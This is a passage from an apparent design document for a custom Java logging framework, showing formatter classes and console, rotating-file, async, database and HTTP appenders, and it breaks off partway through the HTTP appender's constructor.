/**
 * Human-readable single-line text format.
 *
 * Output example:
 *   2024-03-15 14:23:01.456 [http-nio-8080-exec-1] INFO  com.company.OrderService - Order placed: 42 {requestId=abc, userId=7}
 */
public final class TextFormatter implements LogFormatter {

    private static final DateTimeFormatter TIMESTAMP_FMT =
            DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss.SSS")
                    .withZone(ZoneId.systemDefault());

    private final boolean includeMdc;

    public TextFormatter() {
        this(true);
    }

    public TextFormatter(boolean includeMdc) {
        this.includeMdc = includeMdc;
    }

    @Override
    public String format(LogEvent event) {
        var sb = new StringBuilder(256);

        sb.append(TIMESTAMP_FMT.format(event.timestamp()));
        sb.append(" [").append(event.threadName()).append("]");
        sb.append(" ").append(padRight(event.level().name(), 5));
        sb.append(" ").append(event.loggerName());
        sb.append(" - ").append(event.message());

        if (includeMdc && !event.mdcContext().isEmpty()) {
            sb.append(" ").append(formatMdc(event.mdcContext()));
        }

        if (event.throwable() != null) {
            sb.append(System.lineSeparator());
            appendThrowable(sb, event.throwable(), 0);
        }

        return sb.toString();
    }

    private String formatMdc(Map<String, String> mdc) {
        var sb = new StringBuilder("{");
        boolean first = true;
        for (var entry : mdc.entrySet()) {
            if (!first) sb.append(", ");
            sb.append(entry.getKey()).append("=").append(entry.getValue());
            first = false;
        }
        sb.append("}");
        return sb.toString();
    }

    private void appendThrowable(StringBuilder sb, Throwable t, int depth) {
        String indent = "  ".repeat(depth);
        sb.append(indent).append(t.getClass().getName()).append(": ").append(t.getMessage());
        for (StackTraceElement el : t.getStackTrace()) {
            sb.append(System.lineSeparator()).append(indent).append("\tat ").append(el);
        }
        if (t.getCause() != null && depth < 10) {
            sb.append(System.lineSeparator()).append(indent).append("Caused by: ");
            appendThrowable(sb, t.getCause(), depth + 1);
        }
    }

    private String padRight(String s, int width) {
        if (s.length() >= width) return s;
        return s + " ".repeat(width - s.length());
    }
}
```

```java
// com/logging/framework/formatter/JsonFormatter.java
package com.logging.framework.formatter;

import com.logging.framework.core.LogEvent;

import java.time.format.DateTimeFormatter;
import java.util.Map;

/**
 * Structured JSON log format — suitable for ingestion by Elasticsearch,
 * Splunk, Datadog, etc.
 *
 * Output example (single line, newline-delimited JSON):
 * {"timestamp":"2024-03-15T14:23:01.456Z","level":"INFO","logger":"com.company.OrderService",
 *  "thread":"http-nio-8080-exec-1","message":"Order placed: 42",
 *  "mdc":{"requestId":"abc","userId":"7"}}
 *
 * Design: manual JSON building to avoid a runtime dependency on Jackson/Gson.
 * For production, swap this with Jackson ObjectMapper for correctness with
 * special characters (proper escaping is critical for JSON log pipelines).
 */
public final class JsonFormatter implements LogFormatter {

    private static final DateTimeFormatter ISO_FMT = DateTimeFormatter.ISO_INSTANT;

    private final boolean prettyPrint;

    public JsonFormatter() {
        this(false);
    }

    public JsonFormatter(boolean prettyPrint) {
        this.prettyPrint = prettyPrint;
    }

    @Override
    public String format(LogEvent event) {
        String sep = prettyPrint ? System.lineSeparator() + "  " : "";
        String close = prettyPrint ? System.lineSeparator() + "}" : "}";

        var sb = new StringBuilder(512);
        sb.append("{");
        sb.append(sep);
        appendField(sb, "timestamp", ISO_FMT.format(event.timestamp()));
        sb.append(",").append(sep);
        appendField(sb, "level", event.level().name());
        sb.append(",").append(sep);
        appendField(sb, "logger", event.loggerName());
        sb.append(",").append(sep);
        appendField(sb, "thread", event.threadName());
        sb.append(",").append(sep);
        appendField(sb, "message", event.message());

        if (!event.mdcContext().isEmpty()) {
            sb.append(",").append(sep);
            sb.append("\"mdc\":{");
            boolean first = true;
            for (Map.Entry<String, String> entry : event.mdcContext().entrySet()) {
                if (!first) sb.append(",");
                appendField(sb, entry.getKey(), entry.getValue());
                first = false;
            }
            sb.append("}");
        }

        if (event.throwable() != null) {
            sb.append(",").append(sep);
            appendField(sb, "exception", event.throwable().getClass().getName());
            sb.append(",").append(sep);
            appendField(sb, "exceptionMessage", String.valueOf(event.throwable().getMessage()));
            sb.append(",").append(sep);
            appendField(sb, "stackTrace", buildStackTrace(event.throwable()));
        }

        sb.append(close);
        return sb.toString();
    }

    private void appendField(StringBuilder sb, String key, String value) {
        sb.append("\"").append(escapeJson(key)).append("\":");
        sb.append("\"").append(escapeJson(value)).append("\"");
    }

    private String buildStackTrace(Throwable t) {
        var sb = new StringBuilder();
        sb.append(t.toString());
        for (StackTraceElement el : t.getStackTrace()) {
            sb.append("\\n\\tat ").append(el);
        }
        if (t.getCause() != null) {
            sb.append("\\nCaused by: ").append(buildStackTrace(t.getCause()));
        }
        return sb.toString();
    }

    /**
     * Minimal JSON string escaping. For production use, delegate to Jackson's
     * StringEscapeUtils or equivalent.
     */
    private String escapeJson(String s) {
        if (s == null) return "null";
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}
```

```java
// com/logging/framework/formatter/XmlFormatter.java
package com.logging.framework.formatter;

import com.logging.framework.core.LogEvent;

import java.time.format.DateTimeFormatter;
import java.util.Map;

/**
 * XML log format. Less common than JSON but used in environments that consume
 * Log4j XML layout (e.g., Chainsaw viewer).
 *
 * Output example:
 * <log4j:event logger="com.company.OrderService" level="INFO" thread="main" timestamp="...">
 *   <log4j:message><![CDATA[Order placed: 42]]></log4j:message>
 *   <log4j:MDC>
 *     <log4j:data name="requestId" value="abc"/>
 *   </log4j:MDC>
 * </log4j:event>
 */
public final class XmlFormatter implements LogFormatter {

    private static final DateTimeFormatter ISO_FMT = DateTimeFormatter.ISO_INSTANT;

    @Override
    public String format(LogEvent event) {
        var sb = new StringBuilder(512);

        sb.append("<log4j:event")
          .append(" logger=\"").append(xmlEscape(event.loggerName())).append("\"")
          .append(" level=\"").append(event.level().name()).append("\"")
          .append(" thread=\"").append(xmlEscape(event.threadName())).append("\"")
          .append(" timestamp=\"").append(ISO_FMT.format(event.timestamp())).append("\"")
          .append(">").append(System.lineSeparator());

        sb.append("  <log4j:message><![CDATA[")
          .append(event.message())
          .append("]]></log4j:message>").append(System.lineSeparator());

        if (!event.mdcContext().isEmpty()) {
            sb.append("  <log4j:MDC>").append(System.lineSeparator());
            for (Map.Entry<String, String> entry : event.mdcContext().entrySet()) {
                sb.append("    <log4j:data name=\"")
                  .append(xmlEscape(entry.getKey()))
                  .append("\" value=\"")
                  .append(xmlEscape(entry.getValue()))
                  .append("\"/>").append(System.lineSeparator());
            }
            sb.append("  </log4j:MDC>").append(System.lineSeparator());
        }

        if (event.throwable() != null) {
            sb.append("  <log4j:throwable><![CDATA[")
              .append(event.throwable().toString())
              .append("]]></log4j:throwable>").append(System.lineSeparator());
        }

        sb.append("</log4j:event>");
        return sb.toString();
    }

    private String xmlEscape(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&apos;");
    }
}
```

---

### 6.8 Appender Infrastructure

```java
// com/logging/framework/appender/Appender.java
package com.logging.framework.appender;

import com.logging.framework.core.LogEvent;

/**
 * Core appender contract. Every destination (console, file, DB, HTTP) implements this.
 *
 * Lifecycle:
 *   start()  — allocates resources (open file handles, DB connections, etc.)
 *   append() — called for each accepted log event
 *   stop()   — releases resources; must be idempotent
 */
public interface Appender {
    String getName();
    void start();
    void stop();
    boolean isRunning();
    void append(LogEvent event);
}
```

```java
// com/logging/framework/appender/AbstractAppender.java
package com.logging.framework.appender;

import com.logging.framework.core.LogEvent;
import com.logging.framework.filter.FilterChain;
import com.logging.framework.filter.FilterResult;
import com.logging.framework.formatter.LogFormatter;
import com.logging.framework.formatter.TextFormatter;

import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Base class providing common appender behavior:
 * - Lifecycle management (start/stop idempotency via AtomicBoolean)
 * - Filter chain evaluation
 * - Formatter delegation
 * - Error handling template
 *
 * Subclasses implement doAppend(LogEvent, String formattedMessage).
 */
public abstract class AbstractAppender implements Appender {

    private final String name;
    protected volatile LogFormatter formatter;
    protected volatile FilterChain filterChain;
    private final AtomicBoolean running = new AtomicBoolean(false);

    protected AbstractAppender(String name, LogFormatter formatter, FilterChain filterChain) {
        this.name = name;
        this.formatter = (formatter != null) ? formatter : new TextFormatter();
        this.filterChain = (filterChain != null) ? filterChain : FilterChain.empty();
    }

    @Override
    public final String getName() { return name; }

    @Override
    public final boolean isRunning() { return running.get(); }

    @Override
    public final void start() {
        if (running.compareAndSet(false, true)) {
            try {
                doStart();
            } catch (Exception e) {
                running.set(false);
                handleError("Failed to start appender '" + name + "'", e);
                throw new RuntimeException("Appender startup failed: " + name, e);
            }
        }
    }

    @Override
    public final void stop() {
        if (running.compareAndSet(true, false)) {
            try {
                doStop();
            } catch (Exception e) {
                handleError("Error stopping appender '" + name + "'", e);
            }
        }
    }

    @Override
    public final void append(LogEvent event) {
        if (!running.get()) return;

        // Per-appender filter chain (in addition to the logger-level chain)
        if (filterChain.decide(event) == FilterResult.DENY) return;

        String formatted;
        try {
            formatted = formatter.format(event);
        } catch (Exception e) {
            handleError("Formatter failed in appender '" + name + "'", e);
            return;
        }

        try {
            doAppend(event, formatted);
        } catch (Exception e) {
            handleError("doAppend failed in appender '" + name + "'", e);
        }
    }

    // ─── Template methods ────────────────────────────────────────────────────

    protected abstract void doAppend(LogEvent event, String formatted) throws Exception;

    protected void doStart() throws Exception {}

    protected void doStop() throws Exception {}

    protected void handleError(String message, Exception e) {
        System.err.println("[LOGGING FRAMEWORK] " + message + ": " + e.getMessage());
    }

    // ─── Configuration ───────────────────────────────────────────────────────

    public void setFormatter(LogFormatter formatter) {
        this.formatter = formatter;
    }

    public void setFilterChain(FilterChain chain) {
        this.filterChain = (chain != null) ? chain : FilterChain.empty();
    }
}
```

---

### 6.9 Console Appender

```java
// com/logging/framework/appender/ConsoleAppender.java
package com.logging.framework.appender;

import com.logging.framework.api.LogLevel;
import com.logging.framework.core.LogEvent;
import com.logging.framework.filter.FilterChain;
import com.logging.framework.formatter.LogFormatter;

import java.io.PrintStream;

/**
 * Writes formatted log events to stdout (INFO and below) or stderr (WARN and above).
 *
 * Thread safety: PrintStream.println() is synchronized internally — safe for
 * concurrent use without additional locking. For ultra-high throughput,
 * replace with a BufferedWriter + explicit lock or the AsyncAppender wrapper.
 *
 * ANSI color support: enabled when the JVM property "logging.console.color=true"
 * is set. Useful for local development.
 */
public final class ConsoleAppender extends AbstractAppender {

    private static final String ANSI_RESET  = "[0m";
    private static final String ANSI_GREY   = "[37m";
    private static final String ANSI_BLUE   = "[34m";
    private static final String ANSI_GREEN  = "[32m";
    private static final String ANSI_YELLOW = "[33m";
    private static final String ANSI_RED    = "[31m";
    private static final String ANSI_BRIGHT_RED = "[91m";

    private final boolean useColor;
    private final Target target;

    public enum Target { STDOUT, STDERR, AUTO }

    public ConsoleAppender(String name, LogFormatter formatter, FilterChain filterChain,
                           Target target) {
        super(name, formatter, filterChain);
        this.target = target;
        this.useColor = Boolean.getBoolean("logging.console.color");
    }

    public ConsoleAppender(String name, LogFormatter formatter) {
        this(name, formatter, FilterChain.empty(), Target.AUTO);
    }

    @Override
    protected void doAppend(LogEvent event, String formatted) {
        PrintStream stream = resolveStream(event.level());
        String output = useColor ? colorize(event.level(), formatted) : formatted;
        stream.println(output);
    }

    private PrintStream resolveStream(LogLevel level) {
        return switch (target) {
            case STDOUT -> System.out;
            case STDERR -> System.err;
            case AUTO -> level.isAtLeast(LogLevel.WARN) ? System.err : System.out;
        };
    }

    private String colorize(LogLevel level, String message) {
        String color = switch (level) {
            case TRACE -> ANSI_GREY;
            case DEBUG -> ANSI_BLUE;
            case INFO  -> ANSI_GREEN;
            case WARN  -> ANSI_YELLOW;
            case ERROR -> ANSI_RED;
            case FATAL -> ANSI_BRIGHT_RED;
            case OFF   -> ANSI_RESET;
        };
        return color + message + ANSI_RESET;
    }
}
```

---

### 6.10 File Appender with Rotation

```java
// com/logging/framework/appender/rotation/RotationPolicy.java
package com.logging.framework.appender.rotation;

import java.io.File;

/**
 * Strategy for determining when a log file should be rotated.
 */
public interface RotationPolicy {
    /** Called after each write. Returns true if the file should be rotated. */
    boolean shouldRotate(File currentFile, long bytesWrittenThisSession);

    /** Called after a successful rotation to reset any internal state. */
    void onRotation();
}
```

```java
// com/logging/framework/appender/rotation/SizeBasedRotationPolicy.java
package com.logging.framework.appender.rotation;

import java.io.File;

/**
 * Rotates the log file when it exceeds a configured size in bytes.
 *
 * Default: 100 MB
 */
public final class SizeBasedRotationPolicy implements RotationPolicy {

    private final long maxSizeBytes;

    public SizeBasedRotationPolicy(long maxSizeBytes) {
        if (maxSizeBytes <= 0) throw new IllegalArgumentException("maxSizeBytes must be positive");
        this.maxSizeBytes = maxSizeBytes;
    }

    /** Convenience: create from MB. */
    public static SizeBasedRotationPolicy ofMegabytes(long mb) {
        return new SizeBasedRotationPolicy(mb * 1024L * 1024L);
    }

    @Override
    public boolean shouldRotate(File currentFile, long bytesWrittenThisSession) {
        return currentFile.exists() && currentFile.length() >= maxSizeBytes;
    }

    @Override
    public void onRotation() {
        // No state to reset for size-based rotation
    }
}
```

```java
// com/logging/framework/appender/rotation/TimeBasedRotationPolicy.java
package com.logging.framework.appender.rotation;

import java.io.File;
import java.time.Duration;
import java.time.Instant;

/**
 * Rotates the log file on a fixed time interval (e.g., daily, hourly).
 *
 * The rotation check is based on wall clock time. After rotation, the next
 * rotation is scheduled at currentTime + interval.
 */
public final class TimeBasedRotationPolicy implements RotationPolicy {

    private final Duration interval;
    private volatile Instant nextRotationTime;

    public TimeBasedRotationPolicy(Duration interval) {
        if (interval == null || interval.isNegative() || interval.isZero()) {
            throw new IllegalArgumentException("interval must be positive");
        }
        this.interval = interval;
        this.nextRotationTime = Instant.now().plus(interval);
    }

    public static TimeBasedRotationPolicy daily() {
        return new TimeBasedRotationPolicy(Duration.ofDays(1));
    }

    public static TimeBasedRotationPolicy hourly() {
        return new TimeBasedRotationPolicy(Duration.ofHours(1));
    }

    @Override
    public boolean shouldRotate(File currentFile, long bytesWrittenThisSession) {
        return Instant.now().isAfter(nextRotationTime);
    }

    @Override
    public void onRotation() {
        nextRotationTime = Instant.now().plus(interval);
    }
}
```

```java
// com/logging/framework/appender/FileAppender.java
package com.logging.framework.appender;

import com.logging.framework.appender.rotation.RotationPolicy;
import com.logging.framework.core.LogEvent;
import com.logging.framework.filter.FilterChain;
import com.logging.framework.formatter.LogFormatter;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.time.Instant;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.List;
import java.util.concurrent.locks.ReentrantLock;

/**
 * Writes log events to a file with optional rotation support.
 *
 * Thread safety: A ReentrantLock protects the BufferedWriter and rotation logic.
 * All writes are serialized to prevent interleaved lines in the output file.
 *
 * Rotation: When a RotationPolicy signals rotation, the current file is renamed
 * with a timestamp suffix and a new file is opened. Multiple policies can be
 * composed (rotate if size OR time threshold exceeded).
 *
 * Flush strategy: Each write flushes if the event level is ERROR or above,
 * ensuring critical log entries are persisted even if the process crashes.
 * For performance, lower-level events rely on periodic OS flush.
 */
public final class FileAppender extends AbstractAppender {

    private static final DateTimeFormatter ROTATION_SUFFIX_FMT =
            DateTimeFormatter.ofPattern("yyyyMMdd-HHmmss").withZone(ZoneId.systemDefault());

    private final String filePath;
    private final List<RotationPolicy> rotationPolicies;
    private final int maxBackupFiles;
    private final ReentrantLock writeLock = new ReentrantLock();

    private BufferedWriter writer;
    private File currentFile;
    private long bytesWrittenThisSession = 0;

    public FileAppender(String name, String filePath, LogFormatter formatter,
                        FilterChain filterChain, List<RotationPolicy> rotationPolicies,
                        int maxBackupFiles) {
        super(name, formatter, filterChain);
        this.filePath = filePath;
        this.rotationPolicies = (rotationPolicies != null) ? List.copyOf(rotationPolicies) : List.of();
        this.maxBackupFiles = maxBackupFiles;
    }

    public FileAppender(String name, String filePath, LogFormatter formatter) {
        this(name, filePath, formatter, FilterChain.empty(), List.of(), 10);
    }

    @Override
    protected void doStart() throws Exception {
        currentFile = new File(filePath);
        File parent = currentFile.getParentFile();
        if (parent != null && !parent.exists()) {
            if (!parent.mkdirs()) {
                throw new IOException("Could not create log directory: " + parent.getAbsolutePath());
            }
        }
        openWriter();
    }

    @Override
    protected void doStop() throws Exception {
        writeLock.lock();
        try {
            if (writer != null) {
                writer.flush();
                writer.close();
                writer = null;
            }
        } finally {
            writeLock.unlock();
        }
    }

    @Override
    protected void doAppend(LogEvent event, String formatted) throws Exception {
        writeLock.lock();
        try {
            // Check rotation before writing
            if (shouldRotate()) {
                rotate();
            }

            writer.write(formatted);
            writer.newLine();
            bytesWrittenThisSession += formatted.length() + 1;

            // Force flush for high-severity events to ensure persistence
            if (event.level().isAtLeast(com.logging.framework.api.LogLevel.ERROR)) {
                writer.flush();
            }
        } finally {
            writeLock.unlock();
        }
    }

    private boolean shouldRotate() {
        for (RotationPolicy policy : rotationPolicies) {
            if (policy.shouldRotate(currentFile, bytesWrittenThisSession)) {
                return true;
            }
        }
        return false;
    }

    private void rotate() throws IOException {
        // Close current writer
        if (writer != null) {
            writer.flush();
            writer.close();
        }

        // Rename current log file with timestamp suffix
        String suffix = ROTATION_SUFFIX_FMT.format(Instant.now());
        File rotatedFile = new File(filePath + "." + suffix);
        if (!currentFile.renameTo(rotatedFile)) {
            System.err.println("[LOGGING FRAMEWORK] Failed to rename log file during rotation: "
                    + currentFile.getAbsolutePath());
        }

        // Notify all policies so they can reset state
        for (RotationPolicy policy : rotationPolicies) {
            policy.onRotation();
        }

        // Purge old backup files if over limit
        purgeOldBackups();

        // Open fresh log file
        openWriter();
        bytesWrittenThisSession = 0;
    }

    private void purgeOldBackups() {
        File dir = currentFile.getParentFile();
        if (dir == null) return;

        String baseName = currentFile.getName();
        File[] backups = dir.listFiles(
                f -> f.getName().startsWith(baseName + ".") && !f.getName().equals(baseName));
        if (backups == null || backups.length <= maxBackupFiles) return;

        // Sort by modification time (oldest first) and delete excess
        java.util.Arrays.sort(backups, java.util.Comparator.comparingLong(File::lastModified));
        int toDelete = backups.length - maxBackupFiles;
        for (int i = 0; i < toDelete; i++) {
            if (!backups[i].delete()) {
                System.err.println("[LOGGING FRAMEWORK] Could not delete old log backup: "
                        + backups[i].getAbsolutePath());
            }
        }
    }

    private void openWriter() throws IOException {
        // append=true: don't truncate if a file already exists from a previous run
        writer = new BufferedWriter(new FileWriter(currentFile, true), 64 * 1024);
    }
}
```

---

### 6.11 Async Appender

```java
// com/logging/framework/appender/AsyncAppender.java
package com.logging.framework.appender;

import com.logging.framework.core.LogEvent;
import com.logging.framework.filter.FilterChain;

import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Decorator appender that hands off log events to a background thread,
 * returning immediately to the caller.
 *
 * Architecture:
 * - Wraps a delegate Appender (e.g., FileAppender, HttpAppender)
 * - Uses a bounded LinkedBlockingQueue to limit memory usage
 * - A single daemon worker thread drains the queue and calls delegate.append()
 *
 * Back-pressure strategies when the queue is full:
 *   DISCARD        — drop the event silently (highest throughput, lossy)
 *   DISCARD_OLDEST — remove the head of the queue to make room (FIFO-lossy)
 *   BLOCK          — block the caller until space is available (lossless, risky)
 *   CALLER_RUNS    — the calling thread writes directly, bypassing the queue
 *
 * Shutdown: stop() signals the worker via a poison-pill sentinel event,
 * then waits up to shutdownTimeoutMs for it to drain and terminate.
 *
 * Thread safety:
 * - The BlockingQueue handles producer/consumer synchronization.
 * - droppedEvents counter uses AtomicLong for lock-free increment.
 */
public final class AsyncAppender extends AbstractAppender {

    public enum BackPressureStrategy {
        DISCARD,
        DISCARD_OLDEST,
        BLOCK,
        CALLER_RUNS
    }

    // Sentinel poison pill — signals the worker thread to exit cleanly.
    private static final LogEvent POISON_PILL = LogEvent.of(
            com.logging.framework.api.LogLevel.OFF, "POISON_PILL", "__STOP__", null, null);

    private final Appender delegate;
    private final BlockingQueue<LogEvent> queue;
    private final BackPressureStrategy backPressureStrategy;
    private final long shutdownTimeoutMs;
    private final AtomicLong droppedEvents = new AtomicLong(0);

    private volatile Thread workerThread;

    public AsyncAppender(String name, Appender delegate, int queueCapacity,
                         BackPressureStrategy backPressureStrategy, long shutdownTimeoutMs) {
        super(name, null /* formatter not used — delegate has its own */, FilterChain.empty());
        if (delegate == null) throw new IllegalArgumentException("delegate appender must not be null");
        this.delegate = delegate;
        this.queue = new LinkedBlockingQueue<>(queueCapacity);
        this.backPressureStrategy = (backPressureStrategy != null)
                ? backPressureStrategy : BackPressureStrategy.DISCARD;
        this.shutdownTimeoutMs = shutdownTimeoutMs > 0 ? shutdownTimeoutMs : 5000;
    }

    public AsyncAppender(String name, Appender delegate) {
        this(name, delegate, 8192, BackPressureStrategy.DISCARD, 5000);
    }

    @Override
    protected void doStart() {
        delegate.start();
        workerThread = new Thread(this::workerLoop, "async-log-worker-" + getName());
        workerThread.setDaemon(true);
        workerThread.start();
    }

    @Override
    protected void doStop() throws InterruptedException {
        // Enqueue poison pill to signal worker to flush and terminate
        queue.put(POISON_PILL);

        // Wait for worker to finish draining
        if (workerThread != null) {
            workerThread.join(shutdownTimeoutMs);
            if (workerThread.isAlive()) {
                System.err.println("[LOGGING FRAMEWORK] AsyncAppender '" + getName()
                        + "' worker did not finish within " + shutdownTimeoutMs + "ms. Forcing stop.");
                workerThread.interrupt();
            }
        }

        delegate.stop();

        long dropped = droppedEvents.get();
        if (dropped > 0) {
            System.err.println("[LOGGING FRAMEWORK] AsyncAppender '" + getName()
                    + "' dropped " + dropped + " log events during lifecycle.");
        }
    }

    @Override
    protected void doAppend(LogEvent event, String formatted) {
        // Note: formatted is ignored — the delegate will format using its own formatter.
        // We pass the raw LogEvent to the queue.
        enqueue(event);
    }

    /**
     * Override append() from AbstractAppender to skip our own formatter
     * and directly enqueue the raw event for the delegate to format.
     */
    @Override
    public void append(LogEvent event) {
        if (!isRunning()) return;
        enqueue(event);
    }

    private void enqueue(LogEvent event) {
        boolean offered = queue.offer(event);
        if (!offered) {
            switch (backPressureStrategy) {
                case DISCARD -> droppedEvents.incrementAndGet();
                case DISCARD_OLDEST -> {
                    queue.poll();  // remove oldest
                    queue.offer(event);
                    droppedEvents.incrementAndGet();
                }
                case BLOCK -> {
                    try {
                        queue.put(event);  // blocks until space available
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        droppedEvents.incrementAndGet();
                    }
                }
                case CALLER_RUNS -> delegate.append(event);
            }
        }
    }

    private void workerLoop() {
        while (true) {
            try {
                LogEvent event = queue.poll(100, TimeUnit.MILLISECONDS);
                if (event == null) continue;

                // Check for poison pill
                if (event == POISON_PILL) {
                    // Drain remaining events before stopping
                    drainQueue();
                    return;
                }

                delegate.append(event);

            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                drainQueue();
                return;
            } catch (Exception e) {
                // Worker must never die due to an appender exception
                System.err.println("[LOGGING FRAMEWORK] AsyncAppender worker caught exception: "
                        + e.getMessage());
            }
        }
    }

    private void drainQueue() {
        LogEvent event;
        while ((event = queue.poll()) != null) {
            if (event == POISON_PILL) continue;
            try {
                delegate.append(event);
            } catch (Exception e) {
                // Best-effort drain — don't let exceptions stop the drain loop
                System.err.println("[LOGGING FRAMEWORK] Error draining queue: " + e.getMessage());
            }
        }
    }

    public long getDroppedEventCount() { return droppedEvents.get(); }

    public int getQueueSize() { return queue.size(); }

    public int getQueueRemainingCapacity() { return queue.remainingCapacity(); }
}
```

---

### 6.12 Database Appender

```java
// com/logging/framework/appender/DatabaseAppender.java
package com.logging.framework.appender;

import com.logging.framework.core.LogEvent;
import com.logging.framework.filter.FilterChain;
import com.logging.framework.formatter.LogFormatter;

import javax.sql.DataSource;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Timestamp;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.locks.ReentrantLock;

/**
 * Writes log events to a relational database using JDBC.
 *
 * Schema (expected):
 *   CREATE TABLE log_events (
 *     id          BIGINT AUTO_INCREMENT PRIMARY KEY,
 *     timestamp   TIMESTAMP NOT NULL,
 *     level       VARCHAR(10) NOT NULL,
 *     logger_name VARCHAR(512) NOT NULL,
 *     thread_name VARCHAR(128),
 *     message     TEXT,
 *     exception   TEXT,
 *     mdc_context TEXT,
 *     INDEX idx_level (level),
 *     INDEX idx_timestamp (timestamp)
 *   );
 *
 * Performance: Events are batched and flushed every batchFlushIntervalMs
 * OR when the batch reaches batchSize, whichever comes first.
 * This dramatically reduces JDBC round-trips.
 *
 * Thread safety: A ReentrantLock protects the pending batch list.
 * Flushing is done by a ScheduledExecutorService on a separate thread.
 */
public final class DatabaseAppender extends AbstractAppender {

    private static final String INSERT_SQL = """
            INSERT INTO log_events
              (timestamp, level, logger_name, thread_name, message, exception, mdc_context)
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """;

    private final DataSource dataSource;
    private final int batchSize;
    private final long batchFlushIntervalMs;
    private final List<LogEvent> pendingBatch;
    private final ReentrantLock batchLock = new ReentrantLock();
    private ScheduledExecutorService scheduler;

    public DatabaseAppender(String name, DataSource dataSource, LogFormatter formatter,
                            FilterChain filterChain, int batchSize, long batchFlushIntervalMs) {
        super(name, formatter, filterChain);
        this.dataSource = dataSource;
        this.batchSize = batchSize;
        this.batchFlushIntervalMs = batchFlushIntervalMs;
        this.pendingBatch = new ArrayList<>(batchSize);
    }

    public DatabaseAppender(String name, DataSource dataSource) {
        this(name, dataSource, null, FilterChain.empty(), 100, 1000);
    }

    @Override
    protected void doStart() {
        scheduler = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "db-appender-flush-" + getName());
            t.setDaemon(true);
            return t;
        });
        scheduler.scheduleAtFixedRate(
                this::flushBatch,
                batchFlushIntervalMs,
                batchFlushIntervalMs,
                TimeUnit.MILLISECONDS
        );
    }

    @Override
    protected void doStop() throws InterruptedException {
        if (scheduler != null) {
            scheduler.shutdown();
            scheduler.awaitTermination(5, TimeUnit.SECONDS);
        }
        flushBatch(); // final flush
    }

    @Override
    protected void doAppend(LogEvent event, String formatted) {
        batchLock.lock();
        try {
            pendingBatch.add(event);
            if (pendingBatch.size() >= batchSize) {
                List<LogEvent> toFlush = new ArrayList<>(pendingBatch);
                pendingBatch.clear();
                // Flush inline — we're already on the caller's thread
                // For high throughput, wrap this appender in AsyncAppender
                batchLock.unlock();
                try {
                    writeBatch(toFlush);
                } finally {
                    batchLock.lock();
                }
            }
        } finally {
            batchLock.unlock();
        }
    }

    private void flushBatch() {
        List<LogEvent> toFlush;
        batchLock.lock();
        try {
            if (pendingBatch.isEmpty()) return;
            toFlush = new ArrayList<>(pendingBatch);
            pendingBatch.clear();
        } finally {
            batchLock.unlock();
        }
        writeBatch(toFlush);
    }

    private void writeBatch(List<LogEvent> events) {
        try (Connection conn = dataSource.getConnection()) {
            conn.setAutoCommit(false);
            try (PreparedStatement stmt = conn.prepareStatement(INSERT_SQL)) {
                for (LogEvent event : events) {
                    stmt.setTimestamp(1, Timestamp.from(event.timestamp()));
                    stmt.setString(2, event.level().name());
                    stmt.setString(3, event.loggerName());
                    stmt.setString(4, event.threadName());
                    stmt.setString(5, event.message());
                    stmt.setString(6, event.throwable() != null
                            ? event.throwable().toString() : null);
                    stmt.setString(7, serializeMdc(event.mdcContext()));
                    stmt.addBatch();
                }
                stmt.executeBatch();
                conn.commit();
            } catch (SQLException e) {
                conn.rollback();
                throw e;
            }
        } catch (SQLException e) {
            handleError("Failed to write log batch to DB (" + events.size() + " events)", e);
        }
    }

    private String serializeMdc(Map<String, String> mdc) {
        if (mdc == null || mdc.isEmpty()) return null;
        var sb = new StringBuilder();
        boolean first = true;
        for (var entry : mdc.entrySet()) {
            if (!first) sb.append(",");
            sb.append(entry.getKey()).append("=").append(entry.getValue());
            first = false;
        }
        return sb.toString();
    }
}
```

---

### 6.13 HTTP (Remote) Appender

```java
// com/logging/framework/appender/HttpAppender.java
package com.logging.framework.appender;

import com.logging.framework.core.LogEvent;
import com.logging.framework.filter.FilterChain;
import com.logging.framework.formatter.JsonFormatter;
import com.logging.framework.formatter.LogFormatter;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.locks.ReentrantLock;

/**
 * Sends log events to a remote HTTP endpoint (e.g., Logstash, Splunk HEC,
 * custom log aggregator).
 *
 * Uses Java 11+ HttpClient — non-blocking, with configurable timeout and retry.
 * Events are batched into a newline-delimited JSON (NDJSON) payload.
 *
 * Retry strategy: on transient failure (5xx, network error), events are
 * re-queued up to maxRetries times with exponential backoff. On permanent
 * failure, events are dropped and an error is reported to stderr.
 *
 * Design note: In production, wrap with AsyncAppender so that HTTP I/O
 * never blocks the calling thread.
 */
public final class HttpAppender extends AbstractAppender {

    private final String endpointUrl;
    private final String authToken;
    private final int batchSize;
    private final long batchFlushIntervalMs;
    private final int maxRetries;
    private final Duration requestTimeout;

    private final List<LogEvent> pendingBatch;
    private final ReentrantLock batchLock = new ReentrantLock();
    private ScheduledExecutorService scheduler;
    private HttpClient httpClient;

    public HttpAppender(String name, String endpointUrl, String authToken,
                        LogFormatter formatter, FilterChain filterChain,
                        int batchSize, long batchFlushIntervalMs,
                        int maxRetries, Duration requestTimeout) {
